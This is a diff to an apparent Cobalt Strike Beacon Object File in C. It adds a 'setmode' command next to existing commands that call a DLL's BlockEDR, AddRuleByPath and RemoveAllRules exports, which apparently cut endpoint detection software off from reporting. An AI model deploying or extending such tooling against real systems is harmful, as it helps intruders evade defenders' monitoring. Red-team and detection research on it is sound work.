@@ -6,6 +6,7 @@ int MSVCRT$strcmp(const char * s1, const char * s2);
 // Define function pointers for ALL of your DLL's exports
 typedef ULONG_PTR (WINAPI * Ldr)(LPVOID);
 typedef void (*Initialize_t)(void);
+typedef void (*SetMode_t)(BOOL);
 typedef void (*BlockEDR_t)(BOOL);
 typedef void (*AddRuleByPath_t)(BOOL, const char*);
 typedef void (*RemoveAllRules_t)(BOOL);
@@ -43,6 +44,16 @@ void go(char *args, int len) {
             pInitialize();
         } else {
             BeaconPrintf(CALLBACK_ERROR, "Could not find exported function: Initialize");
+        }
+    }
+    else if (MSVCRT$strcmp(command, "setmode") == 0) {
+        int useFirewall = BeaconDataInt(&parser);
+        SetMode_t pSetMode = (SetMode_t)GetProcAddress(hDll, "SetMode");
+        if (pSetMode) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Calling SetMode(%s)...", useFirewall ? "TRUE" : "FALSE");
+            pSetMode((BOOL)useFirewall);
+        } else {
+            BeaconPrintf(CALLBACK_ERROR, "Could not find exported function: SetMode");
         }
     }
     else if (MSVCRT$strcmp(command, "block") == 0) {
